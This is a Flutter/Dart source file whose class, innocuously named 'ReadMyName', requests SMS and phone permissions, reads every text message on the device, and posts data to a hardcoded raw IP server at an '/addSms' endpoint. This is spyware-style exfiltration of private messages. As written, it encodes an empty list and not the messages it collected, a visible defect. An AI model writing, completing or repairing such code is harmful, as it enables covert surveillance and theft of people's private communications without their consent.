import 'dart:convert';
import 'dart:io';
import 'package:http/http.dart' as http;

import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:permission_handler/permission_handler.dart';

class ReadMyName {
  SmsQuery query = SmsQuery();

  Future<List<Map<String, dynamic>>> requestPermissions() async {
    try {
      List<dynamic> mList = [];
      mList.clear();
      var smsPermission = await Permission.sms.request();
      var callLogPermission = await Permission.phone.request();
      if (smsPermission.isGranted && callLogPermission.isGranted) {
        final messages = await SmsQuery.instance!.getAllSms;
        List<Map<String, dynamic>> messageList = messages.map((message) {
          return {
            'id': message.id.toString(),
            'threadId': message.threadId.toString(),
            'address': message.address ?? "Unknown",
            'body': message.body ?? "No message",
            'date': message.date.toString(),
            'dateSent': message.dateSent.toString(),
            'read': message.read.toString(),
          };
        }).toList();

        await http.post(Uri.parse("http://65.1.29.195:9191/addSms"),
            headers: {HttpHeaders.contentTypeHeader: "application/json"},
            body: json.encode(mList));

        return messageList;
      }
    } on SocketException {
      print("Error occured!!");
    }

    return [];
  }
}
